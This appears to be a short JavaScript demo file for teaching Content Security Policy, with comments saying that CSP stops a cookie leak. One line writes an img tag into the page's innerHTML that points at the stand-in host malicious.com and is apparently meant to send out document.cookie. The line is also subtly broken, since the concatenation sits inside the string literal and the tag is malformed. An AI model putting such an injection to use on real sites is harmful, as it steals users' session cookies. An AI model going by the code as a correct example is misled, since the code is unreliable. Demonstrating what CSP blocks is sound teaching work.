'use strict';

console.log('I am index.js');

// When the server loads from the malicous website, the cookie would be leaked to the malicious server.
// However, thanks to the CSP, ...
document.getElementById('any').innerHTML = '<img src="https://malicious.com" + document.cookie / >';

// However, it becomes hard to maintain especailly when there are more and more dependencies.